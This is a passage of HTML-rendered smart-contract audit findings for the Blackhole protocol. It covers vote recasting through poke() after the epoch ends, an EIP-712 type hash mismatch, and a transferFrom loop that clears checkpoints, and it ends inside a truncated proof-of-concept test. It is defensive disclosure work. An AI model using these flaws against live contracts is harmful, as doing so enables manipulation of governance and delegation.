9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Justification\u003c/h3\u003e\n\u003cp\u003eAccess control is broken. This issue is of medium severity because it enables users to bypass the core voting restrictions enforced by the protocol. The \u003ccode\u003evote()\u003c/code\u003e function is designed to block votes after the epoch ends unless specific conditions are met (such as the NFT being whitelisted or having no AVM mapping). However, the \u003ccode\u003epoke()\u003c/code\u003e function lacks these same restrictions, allowing users (including those with blacklisted or ineligible NFTs) to recast votes even after the epoch has concluded. Since \u003ccode\u003epoke()\u003c/code\u003e recalculates vote weights based on the current balance of the NFT, users can amplify their voting power post-deadline by increasing their NFT balance and calling \u003ccode\u003edeposit_for()\u003c/code\u003e, which calls poke. This undermines the intended finality of the voting period, introduces inconsistent access control, and opens the door for manipulation of governance outcomes.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eImplement the same epoch and whitelist checks in the poke function as in the vote function to prevent unauthorized vote recasting after the epoch ends.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eBlackhole disputed\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-13-eip-712-domain-type-hash-mismatch-breaks-signature-based-delegation\" style=\"position:relative;\"\u003e\u003ca href=\"#m-13-eip-712-domain-type-hash-mismatch-breaks-signature-based-delegation\" aria-label=\"m 13 eip 712 domain type hash mismatch breaks signature based delegation permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-35\"\u003e[M-13] EIP-712 domain type hash mismatch breaks signature-based delegation\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-48\"\u003enewspacexyz\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1205\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1205\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1327-L1335\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/VotingEscrow.sol#L1327-L1335\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-9\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-9\" aria-label=\"finding description 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThere is a mistake in how the \u003ccode\u003eDOMAIN_TYPEHASH\u003c/code\u003e constant is defined and used in the \u003ccode\u003eVotingEscrow\u003c/code\u003e contract.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econstant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDOMAIN_TYPEHASH\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;EIP712Domain(string name,uint256 chainId,address verifyingContract)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, when building the domain separator, the contract includes an additional parameter:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edomainSeparator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencode\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDOMAIN_TYPEHASH\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eversion\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echainid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    )\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe problem is that the \u003ccode\u003eDOMAIN_TYPEHASH\u003c/code\u003e does \u003cstrong\u003enot\u003c/strong\u003e include the \u003ccode\u003eversion\u003c/code\u003e parameter, but the contract still tries to encode it. This creates a mismatch between the type hash and the actual encoding, which will lead to incorrect \u003ccode\u003edigest\u003c/code\u003e hashes when signing or verifying messages.\u003c/p\u003e\n\u003ch3 id=\"impact-10\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-10\" aria-label=\"impact 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUsers will be unable to sign or verify messages using the EIP-712 delegation feature.\u003c/li\u003e\n\u003cli\u003eDelegation by signature (\u003ccode\u003edelegateBySig\u003c/code\u003e) will always fail due to signature mismatch.\u003c/li\u003e\n\u003cli\u003eGovernance features relying on off-chain signatures will break.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eUpdate the \u003ccode\u003eDOMAIN_TYPEHASH\u003c/code\u003e to include the \u003ccode\u003eversion\u003c/code\u003e field so that it matches the data structure used in the actual \u003ccode\u003edomainSeparator\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econstant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDOMAIN_TYPEHASH\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis change ensures the type hash includes all the fields being encoded and fixes the signature validation logic.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eBlackhole marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"governor\" style=\"position:relative;\"\u003e\u003ca href=\"#governor\" aria-label=\"governor permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"#governor\"\u003eGovernor\u003c/a\u003e\u003c/h1\u003e\n\u003ch1 id=\"medium-risk-findings-9\" style=\"position:relative;\"\u003e\u003ca href=\"#medium-risk-findings-9\" aria-label=\"medium risk findings 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMedium Risk Findings (9)\u003c/h1\u003e\n\u003ch2 id=\"m-14-checkpoints-are-incorrectly-cleared-during-transferfrom\" style=\"position:relative;\"\u003e\u003ca href=\"#m-14-checkpoints-are-incorrectly-cleared-during-transferfrom\" aria-label=\"m 14 checkpoints are incorrectly cleared during transferfrom permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-153\"\u003e[M-14] Checkpoints are incorrectly cleared during \u003ccode\u003etransferFrom\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-236\"\u003erashmor\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/libraries/VotingDelegationLib.sol#L46-L110\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/libraries/VotingDelegationLib.sol#L46-L110\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-3\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-3\" aria-label=\"finding description and impact 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn the \u003ccode\u003eVotingEscrow\u003c/code\u003e contract, the \u003ccode\u003etransferFrom\u003c/code\u003e function delegates to \u003ccode\u003e_transferFrom\u003c/code\u003e, which in turn calls \u003ccode\u003emoveTokenDelegates\u003c/code\u003e from \u003ccode\u003eVotingDelegationLib\u003c/code\u003e. This function is responsible for updating historical checkpoints that track which token IDs were delegated to which addresses.\u003c/p\u003e\n\u003cp\u003eDuring this process, a flaw occurs in the cleanup logic for the source representative (\u003ccode\u003esrcRep\u003c/code\u003e). Specifically, when \u003ccode\u003e_isCheckpointInNewBlock == false\u003c/code\u003e, the function attempts to mutate the existing checkpoint array (\u003ccode\u003esrcRepNew\u003c/code\u003e) in-place by removing any token ID that no longer belongs to \u003ccode\u003esrcRep\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"59\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eif (ownerOfFn(tId) != srcRep) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    srcRepNew[i] = srcRepNew[length - 1];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    srcRepNew.pop();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    length--;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e} else {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    i++;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe problem arises because, by the time \u003ccode\u003emoveTokenDelegates\u003c/code\u003e is called, the \u003ccode\u003etransferFrom\u003c/code\u003e flow has already invoked \u003ccode\u003e_removeTokenFrom()\u003c/code\u003e, which sets the owner of the token being transferred to \u003ccode\u003eaddress(0)\u003c/code\u003e. As a result, \u003ccode\u003eownerOfFn(tId)\u003c/code\u003e will return \u003ccode\u003e0x0\u003c/code\u003e for the token being transferred.\u003c/p\u003e\n\u003cp\u003eThis means the above condition (\u003ccode\u003eownerOfFn(tId) != srcRep\u003c/code\u003e) will always be true for the token that was just transferred out, causing it to be removed from \u003ccode\u003esrcRepNew\u003c/code\u003e. But due to the in-place mutation without incrementing \u003ccode\u003ei\u003c/code\u003e, the same index is checked again after every pop, potentially skipping or corrupting the loop’s behavior basically clearing all checkpoints. This breaks the whole logic of checkpoints and other functions, depending on it.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eThis is not the only vulnerability in this function, it may be appropriate to rewrite the whole logic.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-9\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"60\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003epragma solidity ^0.8.13;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {Test, console} from \u0026quot;forge-std/Test.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {Black} from \u0026quot;../src/Black.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {VotingEscrow} from \u0026quot;../src/VotingEscrow.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {BlackGovernor} from \u0026quot;../src/BlackGovernor.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {IBlackHoleVotes} from \u0026quot;../src/interfaces/IBlackHoleVotes.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {MinterUpgradeable} from \u0026quot;../src/MinterUpgradeable.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {GaugeManager} from \u0026quot;../src/GaugeManager.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eimport {VotingDelegationLib} from \u0026quot;../src/libraries/VotingDelegationLib.sol\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econtract MockContractDelegates {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    VotingDelegationLib.Data cpData;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public fromOwner;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public toOwner;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public fromDelegate;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    address public toDelegate;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    mapping(uint256 =\u0026gt; address) public idToOwner;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 